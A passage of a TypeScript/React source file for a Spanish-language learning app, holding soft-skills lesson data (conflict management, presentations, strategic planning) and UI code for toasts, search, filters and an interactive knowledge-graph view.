        ],
        acceptance: [
          '✅ 3 miembros con niveles claros de madurez.',
          '✅ Estilo y justificación coherente en cada caso.',
          '✅ Recomendaciones prácticas para interacciones diarias.'
        ],
        hint: 'Pregunta sobre su confianza y experiencia en tareas clave.',
        extra: 'Revisa cambios tras un sprint y ajusta estilos si es necesario.'
      }
    ],
    resources: [
      { title: '📖 “Leadership and the One Minute Manager”', url: 'https://www.amazon.com/Leadership-Minute-Manager-Kenneth-Blanchard/dp/0884274910', description: 'Adaptación del modelo situacional' },
      { title: '📚 Situational Leadership Workbook', url: 'https://www.situational.com/', description: 'Ejercicios prácticos y tests' }
    ],
    tips: [
      '💡 Revisa la madurez cada mes, no la asumas estática.',
      '💡 Combina feedback del colaborador para validar tu evaluación.',
      '💡 Documenta cambios de estilo en tu plan de gestión.'
    ]
  }
},

  /* ────────── SS7 – Gestión de Conflictos (Complejidad 4) ────────── */
{
  id: 'SS7',
  title: 'Gestión de Conflictos',
  category: 'Soft-Skills para ingenieros',
  activated: false,
  complexity: 4,
  prerequisites: ['SS3'],
  related: [],
  summary: 'Estrategias win-win, escucha activa. Ejercicio: matriz Thomas-Kilmann.',
  content: {
    theory: `
# Gestión de Conflictos — Modelo Thomas-Kilmann

| Modo       | Descripción                                 | Cuando usar                          |
|------------|---------------------------------------------|--------------------------------------|
| Competir   | Impone solución, alto interés propio        | Crisis urgentes, decisiones rápidas  |
| Colaborar  | Busca solución ganar-ganar, alto apoyo mutuo| Conflictos complejos, relaciones clave|
| Comprometer| Ceder parte para avanzar                    | Plazos ajustados, mínimos comunes    |
| Evitar     | Postergar o ignorar                         | Conflictos triviales o emociones altas|
| Ceder      | Concede para mantener armonía               | Importancia menor, construir goodwill|

## Estrategias Win-Win  
- Identificar intereses comunes  
- Generar opciones creativas  
- Asegurar satisfacción mutua

## Escucha Activa  
1. Parafrasear lo escuchado  
2. Validar emociones  
3. Preguntas abiertas para explorar causas`,
    examples: [
      {
        title: '💬 Diálogo de Colaboración',
        code: `Ana: “Veo que has modificado el API sin avisar, rompió tests.”  
Luis: “Entiendo, perdona. ¿Qué parte te creó mayor bloqueo?”  
Ana: “El endpoint /orders, necesitamos retrocompatibilidad.”  
Luis: “Podemos añadir flag legacy y documentarlo; ¿te parece?”`
      }
    ],
    exercises: [
      {
        title: '🔍 Ex 1 — Matriz Thomas-Kilmann',
        objective: 'Analizar 3 conflictos reales usando los 5 modos.',
        deliverable: 'Tabla con conflicto, modo elegido y justificación.',
        steps: [
          '1. Elige 3 situaciones de tu equipo (p.ej., deadlines, código, prioridades).',
          '2. Completa para cada: descripción, modo TK, por qué.',
          '3. Sugiere una estrategia win-win alternativa.',
          '4. Comparte con un compañero y discute diferencias.'
        ],
        acceptance: [
          '✅ Tres conflictos claramente descritos.',
          '✅ Modo TK apropiado y justificado.',
          '✅ Propuesta de win-win viable para cada uno.'
        ],
        hint: 'Considera siempre el impacto en la relación a largo plazo.',
        extra: 'Prueba un role-play corto de 5 min para al menos uno.'
      }
    ],
    resources: [
      { title: '📖 Thomas-Kilmann Instrument', url: 'https://www.cpp.com/pdfs/Thomas-Kilmann-Conflict-Mode-Instrument.pdf', description: 'Cuestionario y guía oficial' },
      { title: '🎥 Harvard Negotiation Project', url: 'https://www.youtube.com/watch?v=Hc0T5dn-UgY', description: 'Charlas sobre negociación y conflicto' }
    ],
    tips: [
      '💡 Separa la persona del problema: enfócate en intereses, no en posiciones.',
      '💡 Usa “yo” en lugar de “tú” para evitar juicios (“yo siento” vs “tú hiciste”).',
      '💡 Busca soluciones creativas expandiendo el “pastel”, no recortándolo.'
    ]
  }
},

/* ────────── SS8 – Presentaciones de Alto Impacto (Complejidad 4) ────────── */
{
  id: 'SS8',
  title: 'Presentaciones de Alto Impacto',
  category: 'Soft-Skills para ingenieros',
  activated: false,
  complexity: 4,
  prerequisites: ['SS1'],
  related: [],
  summary: 'Storytelling + Visual Thinking. Ejercicio: deck de 5 diap.',
  content: {
    theory: `
# Presentaciones Efectivas — Storytelling & Visual Thinking

1. **Estructura Narrativa**  
   - Gancho (Why) → Problema → Solución → Beneficio → CTA  
2. **Principios Visuales**  
   - Regla de tercios, contraste, tipografía clara  
   - Uso de iconografía y datos visuales (gráficos, diagramas)  
3. **Menos texto, más visual**  
   - ≤ 6 líneas por diapositiva  
   - Una idea principal por slide`,
    examples: [
      {
        title: '📊 Slide Ejemplo — KPI Dashboard',
        code: `<!-- Imagen: gráfico de barras con tendencia clara -->
<h2>Tasa de Retención 2025</h2>
<img src="retention_trend.png" alt="Tendencia Retención">
<p>Mejoramos del 60% al 75% tras implementación de X</p>`
      }
    ],
    exercises: [
      {
        title: '📈 Ex 1 — Deck de 5 Diapositivas',
        objective: 'Crear un pitch deck breve para tu proyecto.',
        deliverable: '5 slides en PowerPoint o Google Slides.',
        steps: [
          '1. Define el gancho: “¿Sabías que…?”',
          '2. Describe problema con un dato visual.',
          '3. Propón solución con diagrama sencillo.',
          '4. Muestra beneficios cuantificables.',
          '5. Cierra con llamada a la acción clara.'
        ],
        acceptance: [
          '✅ Cada slide tiene ≤ 6 líneas y un elemento visual dominante.',
          '✅ Flujo narrativo lógico y persuasivo.',
          '✅ CTA al final con siguiente paso (demo, reunión, inversión).'
        ],
        hint: 'Usa plantillas minimalistas y deja espacio en blanco.',
        extra: 'Graba narración de voz de 30 s por slide y revisa ritmo.'
      }
    ],
    resources: [
      { title: '📖 “slide:ology”', url: 'https://www.amazon.com/slide-ology-Science-Creating-Presentations-Design/dp/0596522347', description: 'Arte de diseñar slides' },
      { title: '🎥 Nancy Duarte Talks', url: 'https://www.ted.com/speakers/nancy_duarte', description: 'TED Talks sobre storytelling' }
    ],
    tips: [
      '💡 Comienza con datos o historias reales para enganchar.',
      '💡 Practica cronometrando tu presentación (1 min/slide).',
      '💡 Usa la misma paleta de colores para coherencia visual.'
    ]
  }
},

/* ────────── SS9 – Pensamiento Estratégico (Complejidad 5) ────────── */
{
  id: 'SS9',
  title: 'Pensamiento Estratégico',
  category: 'Soft-Skills para ingenieros',
  activated: false,
  complexity: 5,
  prerequisites: ['SS6', 'SS7'],
  related: [],
  summary: 'Análisis SWOT, OKRs. Ejercicio: redacta roadmap 6m.',
  content: {
    theory: `
# Pensamiento Estratégico — SWOT & OKRs

## 1. Análisis SWOT  
- **Strengths**: ventajas internas  
- **Weaknesses**: áreas de mejora  
- **Opportunities**: factores externos favorables  
- **Threats**: riesgos externos

## 2. OKRs (Objectives & Key Results)  
- **O**: declaración cualitativa inspiradora  
- **KR**: métricas cuantitativas (SMART)  
- Alinear OKRs de equipo con visión organizacional`,
    examples: [
      {
        title: '📝 Ejemplo SWOT',
        code: `Strengths: Equipo multidisciplinar  
Weaknesses: Infraestructura legacy  
Opportunities: Mercado SaaS emergente  
Threats: Competidores con mayor financiación`
      },
      {
        title: '🎯 Ejemplo OKR',
        code: `O: Reducir tiempos de despliegue  
KR1: Automatizar CI/CD al 100%  
KR2: Reducir rollback a <5 min  
KR3: Aumentar despliegues a producción a 3/semana`
      }
    ],
    exercises: [
      {
        title: '🚀 Ex 1 — Roadmap 6 Meses',
        objective: 'Diseñar roadmap estratégico con OKRs trimestrales.',
        deliverable: 'Documento con SWOT, 2 Objectives y 3 KRs cada uno.',
        steps: [
          '1. Realiza SWOT rápido de tu proyecto o equipo.',
          '2. Define 2 objetivos estratégicos para próximos 6 meses.',
          '3. Asigna 3 KRs medibles a cada objetivo (SMART).',
          '4. Esquematiza hitos clave en línea de tiempo mensual.'
        ],
        acceptance: [
          '✅ SWOT completo y conciso.',
          '✅ Objetivos inspiradores y alineados con visión.',
          '✅ KRs medibles, ambiciosos y realistas.'
        ],
        hint: 'Usa datos históricos para validar viabilidad de KRs.',
        extra: 'Integra roadmap en herramienta de gestión (Jira, Asana).'
      }
    ],
    resources: [
      { title: '📖 “Measure What Matters”', url: 'https://www.amazon.com/Measure-What-Matters-Google-Foundation/dp/0525536221', description: 'Guía de OKRs por John Doerr' },
      { title: '📚 Balanced Scorecard Institute', url: 'https://balancedscorecard.org/', description: 'Recursos sobre estrategia y KPIs' }
    ],
    tips: [
      '💡 Revisa OKRs cada 2 semanas en stand-up estratégico.',
      '💡 Ajusta SWOT tras cambios de mercado o producto.',
      '💡 Asegura visibilidad del roadmap a todo el equipo.'
    ]
  }
},
/* ────────── SS10 – Innovación y Creatividad (Complejidad 5) ────────── */
];

// ── SISTEMA DE NOTIFICACIONES PROFESIONAL ─────────────────
const showToast = (title: string, description: string, variant: 'default' | 'destructive' | 'success' | 'warning' = 'default') => {
  const toastElement = document.createElement('div');
  
  // Configuración de estilos según variante
  const variants = {
    default: 'bg-gradient-to-r from-slate-800 to-slate-900 border-slate-700 text-white',
    destructive: 'bg-gradient-to-r from-red-500 to-rose-600 border-red-400 text-white',
    success: 'bg-gradient-to-r from-emerald-500 to-teal-600 border-emerald-400 text-white',
    warning: 'bg-gradient-to-r from-amber-500 to-orange-600 border-amber-400 text-white'
  };
  
  const icons = {
    default: '💡',
    destructive: '⚠️',
    success: '✅',
    warning: '🔔'
  };
  
  toastElement.className = `
    fixed top-6 right-6 z-50 p-4 rounded-xl shadow-2xl backdrop-blur-xl
    border transform transition-all duration-500 ease-out max-w-sm
    ${variants[variant]} animate-slide-in
  `;
  
  toastElement.innerHTML = `
    <div class="flex items-start gap-3">
      <span class="text-lg flex-shrink-0 mt-0.5">${icons[variant]}</span>
      <div class="flex-1 min-w-0">
        <div class="font-semibold text-sm mb-1">${title}</div>
        ${description ? `<div class="text-xs opacity-90 leading-relaxed">${description}</div>` : ''}
      </div>
      <button onclick="this.parentElement.parentElement.remove()" 
              class="text-white/60 hover:text-white transition-colors duration-200 text-sm">✕</button>
    </div>
    <div class="absolute bottom-0 left-0 h-1 bg-white/20 rounded-full transition-all duration-3000 animate-progress"></div>
  `;
  
  // Agregar CSS para animaciones
  if (!document.querySelector('#toast-styles')) {
    const style = document.createElement('style');
    style.id = 'toast-styles';
    style.textContent = `
      @keyframes slide-in {
        from { transform: translateX(100%) scale(0.95); opacity: 0; }
        to { transform: translateX(0) scale(1); opacity: 1; }
      }
      @keyframes slide-out {
        from { transform: translateX(0) scale(1); opacity: 1; }
        to { transform: translateX(100%) scale(0.95); opacity: 0; }
      }
      @keyframes progress {
        from { width: 100%; }
        to { width: 0%; }
      }
      .animate-slide-in { animation: slide-in 0.5s ease-out; }
      .animate-slide-out { animation: slide-out 0.3s ease-in; }
      .animate-progress { animation: progress 4s linear; }
    `;
    document.head.appendChild(style);
  }
  
  document.body.appendChild(toastElement);
  
  // Auto-remove con animación
  setTimeout(() => {
    toastElement.classList.add('animate-slide-out');
    setTimeout(() => {
      if (document.body.contains(toastElement)) {
        document.body.removeChild(toastElement);
      }
    }, 300);
  }, 4000);
};

// ── COMPONENTES MEMOIZADOS PARA OPTIMIZACIÓN ─────────────────────────────────
const SearchBar = memo(({ 
  searchTerm, 
  onSearchChange, 
  resultsCount 
}: {
  searchTerm: string;
  onSearchChange: (value: string) => void;
  resultsCount: number;
}) => (
  <div className="flex-1">
    <div className="relative group">
      <div className="absolute -inset-0.5 bg-gradient-to-r from-cyan-500/20 via-blue-500/20 to-purple-500/20 rounded-xl blur-md opacity-0 group-hover:opacity-100 transition-all duration-500" />
      
      <div className="relative bg-gradient-to-r from-slate-800/90 via-slate-700/90 to-slate-800/90 rounded-xl border border-slate-600/50 shadow-lg backdrop-blur-xl">
        <div className="flex items-center p-2">
          <div className="flex items-center justify-center w-10 h-10 rounded-lg bg-gradient-to-br from-cyan-500/20 to-blue-500/20 mx-2">
            <Search className="w-4 h-4 text-cyan-400" />
          </div>
          
          <input
            type="text"
            value={searchTerm}
            onChange={(e) => onSearchChange(e.target.value)}
            placeholder="Buscar fragmentos, conceptos, categorías..."
            className="flex-1 bg-transparent text-white placeholder-slate-400 text-sm font-medium focus:outline-none py-2 px-1"
          />
          
          <AnimatePresence>
            {searchTerm && (
              <motion.div
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                className="flex items-center gap-2 mr-2"
              >
                <div className="bg-slate-600/50 rounded-md px-2 py-1 border border-slate-500/30">
                  <span className="text-slate-300 text-xs font-medium">
                    {resultsCount}
                  </span>
                </div>
                <motion.button
                  whileHover={{ scale: 1.1, rotate: 90 }}
                  whileTap={{ scale: 0.9 }}
                  onClick={() => onSearchChange('')}
                  className="w-6 h-6 bg-slate-600/50 hover:bg-slate-500/50 rounded-md flex items-center justify-center transition-all duration-200"
                >
                  <X className="w-3 h-3 text-slate-300" />
                </motion.button>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    </div>
  </div>
));

const CategoryFilter = memo(({ 
  categories, 
  selectedCategory, 
  onCategoryChange 
}: {
  categories: string[];
  selectedCategory: string;
  onCategoryChange: (category: string) => void;
}) => (
  <div className="relative min-w-[200px]">
    <div className="relative group">
      <div className="relative bg-gradient-to-r from-slate-800/90 via-slate-700/90 to-slate-800/90 rounded-xl border border-slate-600/50 shadow-lg backdrop-blur-xl">
        <div className="flex items-center p-2">
          <div className="flex items-center justify-center w-10 h-10 rounded-lg bg-gradient-to-br from-purple-500/20 to-pink-500/20 mx-2">
            <svg className="w-4 h-4 text-purple-400" viewBox="0 0 24 24" fill="none">
              <path d="M3 7H21L15 13V19L9 15V13L3 7Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </div>
          
          <div className="flex-1 relative">
            <select
              value={selectedCategory}
              onChange={(e) => onCategoryChange(e.target.value)}
              className="w-full appearance-none bg-transparent text-white text-sm font-medium focus:outline-none py-2 px-1 cursor-pointer"
            >
              {categories.map(category => (
                <option key={category} value={category} className="bg-slate-800 text-white py-2">
                  {category === 'Todos' ? 'Todas las categorías' : category}
                </option>
              ))}
            </select>
            
            <div className="absolute right-1 top-1/2 -translate-y-1/2 pointer-events-none">
              <ChevronDown className="w-4 h-4 text-slate-400" />
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
));

const NonLinearLearning = () => {
  const [fragments, setFragments] = useState<Fragment[]>([]);
  // Estado para alternar entre modo oscuro y modo verde
  const [greenMode, setGreenMode] = useState<boolean>(false);
  const [darkMode, setDarkMode] = useState<boolean>(true);
  const [selectedFragment, setSelectedFragment] = useState<Fragment | null>(null);
  const [searchTerm, setSearchTerm] = useState<string>('');
  const [filterCategory, setFilterCategory] = useState<string>('Todos');
  const [currentView, setCurrentView] = useState<ViewType>('fragments');
  const [progressScrollPosition, setProgressScrollPosition] = useState<number>(0);

  useEffect(() => {
    const stored = localStorage.getItem('learningSettings');
    if (stored) {
      try {
        const parsed = JSON.parse(stored);
        if (typeof parsed.darkMode === 'boolean') setDarkMode(parsed.darkMode);
        if (typeof parsed.greenMode === 'boolean') setGreenMode(parsed.greenMode);
      } catch {
        /* ignore parse errors */
      }
    }
  }, []);

  const theme = getTheme({ darkMode, greenMode });

  // ── OPTIMIZACIONES DE RENDIMIENTO ─────────────────────────────────
  
  // Categorías memoizadas
  const categories = useMemo(() => {
    const uniqueCategories = ['Todos', ...new Set(initialFragments.map(f => f.category))];
    return uniqueCategories;
  }, []);

  // Fragmentos filtrados optimizados
  const filteredFragments = useMemo(() => {
    let result = fragments;
    
    // Filtro por categoría
    if (filterCategory !== 'Todos') {
      result = result.filter(fragment => fragment.category === filterCategory);
    }
    
    // Filtro por búsqueda
    if (searchTerm.trim()) {
      const searchLower = searchTerm.toLowerCase();
      result = result.filter(fragment =>
        fragment.title.toLowerCase().includes(searchLower) ||
        fragment.category.toLowerCase().includes(searchLower) ||
        fragment.summary.toLowerCase().includes(searchLower)
      );
    }
    
    return result;
  }, [fragments, filterCategory, searchTerm]);

  // Callbacks optimizados
  const handleSearchChange = useCallback((value: string) => {
    setSearchTerm(value);
  }, []);

  const handleCategoryChange = useCallback((category: string) => {
    setFilterCategory(category);
  }, []);

  const handleFragmentClick = useCallback((fragment: Fragment) => {
    setSelectedFragment(selectedFragment?.id === fragment.id ? null : fragment);
  }, [selectedFragment]);

  const handleFragmentActivate = useCallback((fragmentId: string) => {
    const fragmentToActivate = fragments.find(f => f.id === fragmentId);
    if (!fragmentToActivate) return;

    // Verificar prerrequisitos
    for (const prereqId of fragmentToActivate.prerequisites) {
      const prereqFragment = fragments.find(f => f.id === prereqId);
      if (!prereqFragment?.activated) return;
    }

    const updatedFragments = fragments.map(f =>
      f.id === fragmentId ? { ...f, activated: true } : f
    );
    
    setFragments(updatedFragments);
    localStorage.setItem('learningFragments', JSON.stringify(updatedFragments));
  }, [fragments]);

  const handleViewChange = useCallback((view: ViewType) => {
    setCurrentView(view);
    setSelectedFragment(null); // Limpia selección al cambiar vista
  }, []);

  useEffect(() => {
    // Forzar recarga de todos los fragmentos (temporal)
    setFragments(initialFragments);
    localStorage.setItem('learningFragments', JSON.stringify(initialFragments));
    
    // Código original comentado temporalmente
    // const storedFragments = localStorage.getItem('learningFragments');
    // if (storedFragments) {
    //   setFragments(JSON.parse(storedFragments));
    // } else {
    //   setFragments(initialFragments);
    //   localStorage.setItem('learningFragments', JSON.stringify(initialFragments));
    // }
  }, []);

  const handleActivateFragment = useCallback((fragmentId: string) => {
    // Guardar posición de scroll actual si estamos en vista de progreso
    if (currentView === 'progress') {
      const progressContainer = document.querySelector('[data-progress-container="true"]');
      if (progressContainer) {
        setProgressScrollPosition(progressContainer.scrollTop);
      }
    }

    const fragmentToActivate = fragments.find(f => f.id === fragmentId);
    if (!fragmentToActivate) return;
    
    const canActivate = fragmentToActivate.prerequisites.every(prereqId => {
      const prereqFragment = fragments.find(f => f.id === prereqId);
      return prereqFragment && prereqFragment.activated;
    });

    if (canActivate) {
      const updatedFragments = fragments.map(f =>
        f.id === fragmentId ? { ...f, activated: true } : f
      );
      setFragments(updatedFragments);
      localStorage.setItem('learningFragments', JSON.stringify(updatedFragments));
      showToast(
        "¡Fragmento Activado!",
        `"${fragmentToActivate.title}" ahora forma parte de tu conocimiento simbiótico.`,
        "default"
      );
    } else {
      showToast(
        "Prerrequisitos Incompletos",
        `No se pueden activar "${fragmentToActivate.title}". Completa los fragmentos requeridos primero.`,
        "destructive"
      );
    }
  }, [fragments, showToast, currentView]);
  
  const handleSelectFragment = useCallback((fragment: Fragment) => {
    setSelectedFragment(fragment);
  }, []);

  const NetworkView = () => {
    const [selectedNode, setSelectedNode] = useState<Fragment | null>(null);
    const [zoomLevel, setZoomLevel] = useState<number>(1);
    const [dragOffset, setDragOffset] = useState<{x: number, y: number}>({ x: 0, y: 0 });
    const [isDragging, setIsDragging] = useState<boolean>(false);
    const [lastMousePos, setLastMousePos] = useState<{x: number, y: number}>({ x: 0, y: 0 });
    const [layoutMode, setLayoutMode] = useState<'circular' | 'category' | 'force'>('category');
    const [isColorBlindMode, setIsColorBlindMode] = useState<boolean>(false);
    const [showMiniMap, setShowMiniMap] = useState<boolean>(true);
    const [currentNodePositions, setCurrentNodePositions] = useState<Fragment[]>([]);
    const [filteredNodesCount, setFilteredNodesCount] = useState<number>(0);
    const graphRef = useRef<HTMLDivElement>(null);
    const miniMapRef = useRef<SVGSVGElement>(null);
    
    // Mejora #1: Funciones para guardar/restaurar posiciones en force-directed (memoizadas)
    const restorePositions = useCallback((nodes: Fragment[]) => {
      const positions = JSON.parse(localStorage.getItem('nn-positions') || '{}');
      return nodes.map(node => {
        if (positions[node.id] && layoutMode === 'force') {
          const { x, y } = positions[node.id];
          return { ...node, x, y, fx: x, fy: y };
        }
        return node;
      });
    }, [layoutMode]);
    
    // Mejora #2: Contador de nodos filtrados (memoizado)
    const getFilteredFragments = useCallback(() => {
      const filtered = fragments.filter(fragment => {
        const matchesSearch = fragment.title.toLowerCase().includes(searchTerm.toLowerCase()) || 
                             fragment.summary.toLowerCase().includes(searchTerm.toLowerCase());
        const matchesCategory = filterCategory === 'Todos' || fragment.category === filterCategory;
        return matchesSearch && matchesCategory;
      });
      setFilteredNodesCount(fragments.length - filtered.length);
      return filtered;
    }, [fragments, searchTerm, filterCategory]);
    
    // Mejora #4: Función para verificar si un nodo está en vista (memoizada)
    const isNodeInView = useCallback((node: Fragment, viewport: {width: number, height: number}) => {
      const padding = 100;
      return (
        (node.x || 0) * zoomLevel + dragOffset.x >= -padding &&
        (node.x || 0) * zoomLevel + dragOffset.x <= viewport.width + padding &&
        (node.y || 0) * zoomLevel + dragOffset.y >= -padding &&
        (node.y || 0) * zoomLevel + dragOffset.y <= viewport.height + padding
      );
    }, [zoomLevel, dragOffset]);
    
    // Mejora #6: Paletas de colores mejoradas para daltónicos
    const colorPalettes = {
      normal: {
        categories: ['#3b82f6', '#10b981', '#f59e0b', '#8b5cf6', '#ef4444', '#06b6d4'],
        activated: '#10b981',
        blocked: '#6b7280',
        prerequisite: '#fbbf24',
        related: '#8b5cf6'
      },
      colorBlind: {
        categories: ['#0173b2', '#de8f05', '#cc78bc', '#ca9161', '#fbafe4', '#949494'],
        activated: '#029e73',
        blocked: '#949494',
        prerequisite: '#d55e00',
        related: '#0173b2'
      }
    };
    
    const currentPalette = isColorBlindMode ? colorPalettes.colorBlind : colorPalettes.normal;
    
    // Mejora #3: Manejador de teclado mejorado con focus management
    const handleKeyDown = useCallback((e: KeyboardEvent) => {
      const panSpeed = 20;
      switch (e.key) {
        case 'ArrowUp':
        case 'w':
        case 'W':
          setDragOffset(prev => ({ ...prev, y: prev.y + panSpeed }));
          e.preventDefault();
          break;
        case 'ArrowDown':
        case 's':
        case 'S':
          setDragOffset(prev => ({ ...prev, y: prev.y - panSpeed }));
          e.preventDefault();
          break;
        case 'ArrowLeft':
        case 'a':
        case 'A':
          setDragOffset(prev => ({ ...prev, x: prev.x + panSpeed }));
          e.preventDefault();
          break;
        case 'ArrowRight':
        case 'd':
        case 'D':
          setDragOffset(prev => ({ ...prev, x: prev.x - panSpeed }));
          e.preventDefault();
          break;
        case 'f':
        case 'F':
          if (selectedNode) {
            // Centrar en nodo seleccionado
            const node = currentNodePositions.find(n => n.id === selectedNode.id);
            if (node && node.x !== undefined && node.y !== undefined) {
              setDragOffset({ x: 400 - node.x, y: 300 - node.y });
              showToast("Nodo Enfocado", `Centrando vista en "${node.title}"`, "default");
            }
          } else if (currentNodePositions.length > 0) {
            // Si no hay nodo seleccionado, seleccionar el primero activado o el primero disponible
            const firstActivated = currentNodePositions.find(n => n.activated);
            const targetNode = firstActivated || currentNodePositions[0];
            if (targetNode && targetNode.x !== undefined && targetNode.y !== undefined) {
              setSelectedNode(targetNode);
              setDragOffset({ x: 400 - targetNode.x, y: 300 - targetNode.y });
              showToast("Navegación", `Enfocando en "${targetNode.title}"`, "default");
            }
          }
          e.preventDefault();
          break;
        case 'Tab':
          // Navegación entre nodos con Tab
          if (currentNodePositions.length > 0) {
            const currentIndex = selectedNode ? currentNodePositions.findIndex(n => n.id === selectedNode.id) : -1;
            const nextIndex = e.shiftKey 
              ? (currentIndex - 1 + currentNodePositions.length) % currentNodePositions.length
              : (currentIndex + 1) % currentNodePositions.length;
            const nextNode = currentNodePositions[nextIndex];
            if (nextNode && nextNode.x !== undefined && nextNode.y !== undefined) {
              setSelectedNode(nextNode);
              setDragOffset({ x: 400 - nextNode.x, y: 300 - nextNode.y });
            }
          }
          e.preventDefault();
          break;
        case 'Enter':
        case ' ':
          // Activar fragmento seleccionado
          if (selectedNode && !selectedNode.activated) {
            const canActivate = selectedNode.prerequisites.every(prereqId => {
              const prereq = fragments.find(f => f.id === prereqId);
              return !prereq || prereq.activated;
            });
            if (canActivate) {
              handleActivateFragment(selectedNode.id);
            } else {
              showToast("No Disponible", "Completa los prerrequisitos primero", "destructive");
            }
          } else if (selectedNode && selectedNode.activated) {
            handleSelectFragment(selectedNode);
          }
          e.preventDefault();
          break;
        case 'Escape':
          setSelectedNode(null);
          e.preventDefault();
          break;
        case '+':
        case '=':
          setZoomLevel(prev => Math.min(prev + 0.2, 3));
          e.preventDefault();
          break;
        case '-':
        case '_':
          setZoomLevel(prev => Math.max(prev - 0.2, 0.3));
          e.preventDefault();
          break;
        case 'm':
        case 'M':
          setShowMiniMap(prev => {
            const newValue = !prev;
            showToast("Mini-mapa", newValue ? "Mostrado" : "Oculto", "default");
            return newValue;
          });
          e.preventDefault();
          break;
        case 'c':
        case 'C':
          setIsColorBlindMode(prev => {
            const newValue = !prev;
            showToast("Modo Visual", newValue ? "Daltónico" : "Normal", "default");
            return newValue;
          });
          e.preventDefault();
          break;
        case 'r':
        case 'R':
          setZoomLevel(1);
          setDragOffset({ x: 0, y: 0 });
          showToast("Vista Restablecida", "Zoom y posición reiniciados", "default");
          e.preventDefault();
          break;
        case '1':
        case '2':
        case '3':
          // Cambio rápido de layout con números
          const layouts: ('circular' | 'category' | 'force')[] = ['circular', 'category', 'force'];
          const layoutIndex = parseInt(e.key) - 1;
          if (layouts[layoutIndex]) {
            setLayoutMode(layouts[layoutIndex]);
            showToast("Layout Cambiado", `Modo: ${layouts[layoutIndex]}`, "default");
          }
          e.preventDefault();
          break;
      }
    }, [selectedNode, currentNodePositions, fragments, handleActivateFragment, handleSelectFragment]);
    
    useEffect(() => {
      document.addEventListener('keydown', handleKeyDown);
      return () => document.removeEventListener('keydown', handleKeyDown);
    }, [handleKeyDown]);
    
    const calculateNodePositions = useCallback((): Fragment[] => {
      const svgEl = graphRef.current?.querySelector('svg');
      const width  = svgEl?.clientWidth  || 800;  // fallback a 800 si no existe aún
      const height = svgEl?.clientHeight || 600;  // fallback a 600 si no existe aún
      const centerX = width  / 2;
      const centerY = height / 2;
      const fragmentsToShow = getFilteredFragments();
      
      if (layoutMode === 'circular') {
        // Aumentar radio y espaciado para mejor legibilidad
        const baseRadius = Math.max(220, fragmentsToShow.length * 8);
        const positions = fragmentsToShow.map((fragment, index) => {
          const angle = (index * 2 * Math.PI) / fragmentsToShow.length;
          const x = centerX + baseRadius * Math.cos(angle);
          const y = centerY + baseRadius * Math.sin(angle);
          return { ...fragment, x, y };
        });
        return restorePositions(positions);
      }
      
      if (layoutMode === 'category') {
        const categories = ['Fundamentos Frontend', 'Backend y APIs', 'DevOps & Cloud', 'IA / Datos & RAG', 'Ciberseguridad Práctica', 'Soft‑Skills para Ingenieros'];
        const categoryColors = isColorBlindMode ? currentPalette.categories : ['#3b82f6', '#10b981', '#f59e0b', '#8b5cf6', '#ef4444', '#06b6d4'];
        
        const positions = fragmentsToShow.map((fragment) => {
          const categoryIndex = categories.indexOf(fragment.category);
          const categoryFragments = fragmentsToShow.filter(f => f.category === fragment.category);
          const fragmentIndex = categoryFragments.findIndex(f => f.id === fragment.id);
          
          // Mejorar distribución por categorías con más espacio
          const categoryAngle = (categoryIndex * 2 * Math.PI) / categories.length;
          const categoryRadius = 280;
          const fragmentRadius = 80 + (fragmentIndex * 25);
          const fragmentAngle = categoryAngle + (fragmentIndex * 0.3);
          
          const x = centerX + categoryRadius * Math.cos(categoryAngle) + fragmentRadius * Math.cos(fragmentAngle);
          const y = centerY + categoryRadius * Math.sin(categoryAngle) + fragmentRadius * Math.sin(fragmentAngle);
          
          return { ...fragment, x, y, categoryColor: categoryColors[categoryIndex] };
        });
        return restorePositions(positions);
      }
      
      if (layoutMode === 'force') {
        // Verificar si hay posiciones guardadas
        const savedPositions = JSON.parse(localStorage.getItem('nn-positions') || '{}');
        const hasPositions = Object.keys(savedPositions).length > 0;
        
        if (hasPositions) {
          // Usar posiciones guardadas
          const positions = fragmentsToShow.map(fragment => {
            if (savedPositions[fragment.id]) {
              const { x, y } = savedPositions[fragment.id];
              return { ...fragment, x, y, fx: x, fy: y };
            }
            return {
              ...fragment,
              x: centerX + (Math.random() - 0.5) * 400,
              y: centerY + (Math.random() - 0.5) * 300
            };
          });
          return positions;
        }
        
        // Algoritmo optimizado de force-directed layout con menos iteraciones para mejor rendimiento
        const positions = new Map();
        const nodeCount = fragmentsToShow.length;
        
        fragmentsToShow.forEach((fragment) => {
          positions.set(fragment.id, {
            x: centerX + (Math.random() - 0.5) * 400,
            y: centerY + (Math.random() - 0.5) * 300,
            vx: 0,
            vy: 0
          });
        });
        
        // Optimización: ajustar parámetros para mejor distribución visual
        const maxIterations = Math.min(80, Math.max(40, 150 - nodeCount * 1.5));
        const repulsionStrength = Math.max(1200, 2000 - nodeCount * 15);
        const attractionStrength = Math.min(0.025, 0.02 + nodeCount * 0.0002);
        
        // Simular fuerzas con optimizaciones de rendimiento
        for (let iter = 0; iter < maxIterations; iter++) {
          const temperature = 1 - iter / maxIterations; // Enfriamiento progresivo
          
          // Repulsión entre nodos (optimizada con temperatura)
          fragmentsToShow.forEach(fragment1 => {
            const pos1 = positions.get(fragment1.id);
            fragmentsToShow.forEach(fragment2 => {
              if (fragment1.id !== fragment2.id) {
                const pos2 = positions.get(fragment2.id);
                const dx = pos1.x - pos2.x;
                const dy = pos1.y - pos2.y;
                const distance = Math.sqrt(dx * dx + dy * dy) || 1;
                const force = (repulsionStrength / (distance * distance)) * temperature;
                pos1.vx += (dx / distance) * force;
                pos1.vy += (dy / distance) * force;
              }
            });
          });
          
          // Atracción por conexiones
          fragmentsToShow.forEach(fragment => {
            const connections = [...fragment.related, ...fragment.prerequisites];
            connections.forEach(connId => {
              const connFragment = fragmentsToShow.find(f => f.id === connId);
              if (connFragment) {
                const pos1 = positions.get(fragment.id);
                const pos2 = positions.get(connFragment.id);
                const dx = pos2.x - pos1.x;
                const dy = pos2.y - pos1.y;
                const distance = Math.sqrt(dx * dx + dy * dy) || 1;
                const force = distance * attractionStrength * temperature;
                pos1.vx += (dx / distance) * force;
                pos1.vy += (dy / distance) * force;
              }
            });
          });
          
          // Aplicar velocidades con damping y temperatura
          positions.forEach(pos => {
